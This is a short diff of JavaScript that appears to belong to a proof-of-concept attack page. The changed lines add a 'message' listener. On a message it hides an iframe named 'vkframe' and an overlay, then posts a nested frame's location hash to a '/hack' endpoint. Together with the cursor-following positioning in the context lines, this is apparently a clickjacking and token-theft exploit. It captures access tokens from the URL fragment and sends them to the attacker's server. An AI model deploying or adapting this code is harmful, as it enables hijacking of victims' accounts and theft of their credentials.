@@ -16,8 +16,8 @@
          top:   e.pageY - 16
       });
     });
-    $(window).on('fetched', function(){
-      alert(1);
+    $(window).on('message', function(e){
+      console.log(e);
       $("#vkframe").hide();
       $("#overlay").hide();
       $.post("/hack", {hash:frames[0].frames[0].location.hash})
